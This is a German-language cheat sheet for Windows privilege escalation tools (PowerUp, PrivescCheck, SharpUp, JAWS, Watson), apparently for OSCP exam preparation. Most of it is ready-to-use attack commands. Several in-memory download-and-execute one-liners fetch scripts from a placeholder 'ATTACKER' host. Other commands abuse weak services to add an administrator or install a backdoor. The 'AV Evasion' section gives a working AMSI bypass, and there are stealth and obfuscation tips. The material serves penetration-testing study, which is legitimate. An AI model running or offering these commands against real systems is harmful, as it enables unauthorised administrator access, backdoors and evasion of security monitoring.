# Windows Privilege Escalation Tools Suite

Umfassender Guide für Windows PrivEsc Enumeration & Exploitation Tools.

---

## PowerUp (PowerSploit)

### Was ist PowerUp?

PowerShell-basiertes PrivEsc Tool aus der PowerSploit-Suite. Findet häufige Windows-Fehlkonfigurationen.

### Download & Installation

```powershell
# Download
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# Load in Memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')

# Oder lokal
Import-Module .\PowerUp.ps1
```

### Basis-Usage

```powershell
# Alle Checks ausführen
Invoke-AllChecks

# Nur Service-Checks
Invoke-ServiceAbuse

# Nur DLL Hijacking
Find-ProcessDLLHijack

# Nur Path Hijacking
Find-PathDLLHijack
```

### Wichtigste Checks

```powershell
# Service Misconfigurations
Get-ServiceUnquoted          # Unquoted service paths
Get-ModifiableServiceFile    # Writable service binaries
Get-ModifiableService        # Weak service permissions
Get-ServiceDetail            # All service info

# DLL Hijacking
Find-ProcessDLLHijack        # Process DLL hijack opportunities
Find-PathDLLHijack           # %PATH% DLL hijack

# Registry
Get-RegistryAutoLogon        # Autologon credentials
Get-RegistryAlwaysInstallElevated  # AlwaysInstallElevated

# Scheduled Tasks
Get-ModifiableScheduledTaskFile  # Writable task files

# File/Folder Permissions
Get-UnattendedInstallFile    # Unattended install files (passwords!)
Get-WebConfig                # Web.config files (passwords!)
Get-ApplicationHost          # ApplicationHost.config
Get-ModifiablePath           # Writable paths in %PATH%

# Token Privileges
Get-ProcessTokenPrivilege    # Token privileges
```

### Exploitation

```powershell
# Abuse Unquoted Service Path
Write-ServiceBinary -Name VulnService -Path "C:\Program Files\Vuln Service\common.exe"

# Abuse Weak Service Permissions
Invoke-ServiceAbuse -Name VulnService -Command "net localgroup administrators user /add"

# Install backdoor
Install-ServiceBinary -Name VulnService -Command "C:\Temp\backdoor.exe"

# Restore Service
Restore-ServiceBinary -Name VulnService
```

### Quick Win

```powershell
# One-Liner für alle Checks
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"
```

---

## PrivescCheck

### Was ist PrivescCheck?

Modernes PowerShell PrivEsc Enumeration Tool. Umfassender als PowerUp.

### Download

```powershell
# GitHub
https://github.com/itm4n/PrivescCheck

# Download & Execute
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PrivescCheck.ps1')
```

### Basis-Usage

```powershell
# Import
Import-Module .\PrivescCheck.ps1

# Standard Audit
Invoke-PrivescCheck

# Extended Audit (mehr Checks)
Invoke-PrivescCheck -Extended

# Report als HTML
Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML

# Report als TXT
Invoke-PrivescCheck -Report PrivescCheck -Format TXT

# Report als CSV
Invoke-PrivescCheck -Report PrivescCheck -Format CSV

# Report als XML
Invoke-PrivescCheck -Report PrivescCheck -Format XML
```

### Check-Kategorien

```powershell
# User Info
Invoke-UserCheck

# Service Checks
Invoke-ServiceCheck

# Application Checks
Invoke-ApplicationCheck

# Scheduled Tasks
Invoke-ScheduledTaskCheck

# Hardening Checks
Invoke-HardeningCheck

# Network Checks
Invoke-NetworkCheck

# Updates
Invoke-UpdateCheck

# Credential Checks
Invoke-CredentialCheck
```

### Output verstehen

```
[*] USER > Identity
| Name                     : DESKTOP\lowpriv
| SID                      : S-1-5-21-...
| Integrity                : Medium
| Privileges               : SeChangeNotifyPrivilege

[!] APPS > Non-default Apps
| Name                     : Vulnerable App 1.0
| Path                     : C:\Program Files\VulnApp\app.exe
| Permissions              : NT AUTHORITY\Authenticated Users (M)
| → Writable by current user!

[!] SERVICES > Unquoted Path
| Name                     : VulnerableService
| Path                     : C:\Program Files\My Service\service.exe
| → Exploit: Create C:\Program.exe
```

### Erweiterte Optionen

```powershell
# Nur bestimmte Checks
Invoke-PrivescCheck -Extended -Report test -Checks (Get-PrivescCheck | Where-Object {$_.Category -eq 'Service'})

# Quiet Mode (weniger Output)
Invoke-PrivescCheck -Silent

# Force (ignoriere Errors)
Invoke-PrivescCheck -Force
```

---

## SharpUp

### Was ist SharpUp?

C# Port von PowerUp. Kompilierte Binary, AV-resistenter.

### Download & Compilation

```powershell
# Pre-compiled
https://github.com/GhostPack/SharpUp/releases

# Oder compile from source
git clone https://github.com/GhostPack/SharpUp
# Visual Studio → Compile
```

### Basis-Usage

```cmd
# Alle Checks
SharpUp.exe

# Audit-only (keine Exploitation)
SharpUp.exe audit

# Specific Checks
SharpUp.exe RegistryAutoLogons
SharpUp.exe UnquotedServicePaths
SharpUp.exe ModifiableServices
SharpUp.exe ModifiableServiceBinaries
SharpUp.exe AlwaysInstallElevated
SharpUp.exe CachedGPPPassword
```

### Output Parsing

```cmd
# In File speichern
SharpUp.exe > sharpup_output.txt

# Nur wichtige Findings
SharpUp.exe | findstr /i "modifiable"
```

### Execute-Assembly (Cobalt Strike / C2)

```
execute-assembly /path/to/SharpUp.exe
```

---

## JAWS (Just Another Windows Enum Script)

### Was ist JAWS?

PowerShell Enumeration Script, optimiert für Übersichtlichkeit.

### Download

```powershell
# GitHub
https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1

# Execute in Memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/jaws-enum.ps1')
```

### Usage

```powershell
# Standard Run
.\jaws-enum.ps1

# Output in File
.\jaws-enum.ps1 -OutputFilename jaws-output.txt

# Mit allen Checks
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt
```

### Was JAWS checkt

- Running Processes
- Installed Software
- Network Configuration
- Firewall Rules
- User Information
- AlwaysInstallElevated
- Unquoted Service Paths
- Writable Services
- Scheduled Tasks
- Credential Files
- Autologon Passwords

---

## Watson

### Was ist Watson?

Enumeriert Missing Patches und schlägt Kernel Exploits vor (Windows).

### Download

```powershell
# Pre-compiled
https://github.com/rasta-mouse/Watson/releases

# Compile
git clone https://github.com/rasta-mouse/Watson
# Visual Studio → Compile
```

### Usage

```cmd
# Standard Enumeration
Watson.exe

# Output erklärt
# [*] OS Version: 10.0.17763 N/A Build 17763
# [*] Enumerating installed KBs...
# [!] CVE-2019-0841 : VULNERABLE
#   [>] https://github.com/...)
# [!] CVE-2019-1064 : VULNERABLE
```

### Nach Exploits suchen

```bash
# Basierend auf Watson Output
searchsploit windows 10 17763
searchsploit CVE-2019-0841

# GitHub suchen
# https://github.com/search?q=CVE-2019-0841
```

### Häufige Kernel Exploits

```
CVE-2019-0841  - Windows 10 ALPC Task Scheduler
CVE-2019-1064  - Windows 10 AppX Deployment Service
CVE-2019-1388  - UAC Bypass
CVE-2020-0787  - Background Intelligent Transfer Service (BITS)
MS16-032       - Secondary Logon Handle
MS16-135       - Win32k Elevation of Privilege
```

---

## Tool-Vergleich

| Tool | Typ | AV Detection | Umfang | Beste Use-Case |
|------|-----|--------------|--------|----------------|
| **WinPEAS** | EXE/BAT/PS1 | Hoch | ⭐⭐⭐⭐⭐ | Comprehensive, automated |
| **PowerUp** | PowerShell | Mittel | ⭐⭐⭐⭐ | Service misconfigs |
| **PrivescCheck** | PowerShell | Mittel | ⭐⭐⭐⭐⭐ | Modern, detailed reports |
| **SharpUp** | C# EXE | Niedrig | ⭐⭐⭐⭐ | AV bypass, quick |
| **JAWS** | PowerShell | Niedrig | ⭐⭐⭐ | Quick enum, readable |
| **Watson** | C# EXE | Niedrig | ⭐⭐ | Kernel exploits only |
| **Seatbelt** | C# EXE | Niedrig | ⭐⭐⭐⭐⭐ | Deep system enum |

---

## Workflow: Alle Tools kombinieren

### Phase 1: Quick Enum

```powershell
# 1. Watson (Kernel Exploits)
.\Watson.exe

# 2. SharpUp (Quick Checks)
.\SharpUp.exe
```

### Phase 2: Detailed Enum

```powershell
# 3. PrivescCheck (umfassend)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PrivescCheck.ps1')
Invoke-PrivescCheck -Extended -Report report

# Oder WinPEAS
.\winPEASx64.exe > winpeas.txt
```

### Phase 3: Manual Verification

```powershell
# Findings manuell prüfen
# z.B. Unquoted Service Path:
sc qc VulnService
icacls "C:\Program Files\Vuln Service"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## OPSEC Considerations

### AV Evasion

```powershell
# PowerShell Tools - AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Dann Tool laden
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')

# C# Tools (SharpUp, Watson) - weniger detections
# Aber: Obfuscate wenn nötig
```

### Stealth Enum

```powershell
# Minimal footprint
# Nur spezifische Checks, kein "Invoke-AllChecks"
Get-ServiceUnquoted
Get-RegistryAutoLogon
Get-UnattendedInstallFile
```

---

## Quick Reference

### PowerUp
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')
Invoke-AllChecks
```

### PrivescCheck
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PrivescCheck.ps1')
Invoke-PrivescCheck -Extended -Report report
```

### SharpUp
```cmd
SharpUp.exe
```

### JAWS
```powershell
.\jaws-enum.ps1 -OutputFilename jaws.txt
```

### Watson
```cmd
Watson.exe
```

---

## OSCP Exam Tips

1. **Mehrere Tools nutzen** - Jedes findet andere Dinge
2. **PowerUp/SharpUp zuerst** - Schnell, fokussiert auf exploitable misconfigs
3. **PrivescCheck/WinPEAS für Details** - Wenn Zeit ist
4. **Watson für Kernel** - Kernel exploits = last resort
5. **Manual Verification** - Tools zeigen den Weg, du musst exploiten
6. **AMSI Bypass** - Fast immer nötig für PowerShell Tools
7. **In-Memory ausführen** - IEX statt disk write
8. **Output speichern** - Für Report und spätere Analyse

---

## Resources

- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- PrivescCheck: https://github.com/itm4n/PrivescCheck
- SharpUp: https://github.com/GhostPack/SharpUp
- JAWS: https://github.com/411Hall/JAWS
- Watson: https://github.com/rasta-mouse/Watson
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
